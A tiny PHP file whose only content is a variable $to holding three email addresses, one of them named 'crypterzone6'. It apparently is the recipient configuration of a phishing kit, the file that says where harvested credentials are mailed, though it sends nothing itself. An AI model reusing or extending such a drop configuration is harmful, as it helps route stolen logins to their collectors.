<?php

$to ="postmasteragencies@gmail.com, crypterzone6@yandex.com, postmasteragencies365@gmail.com";

?>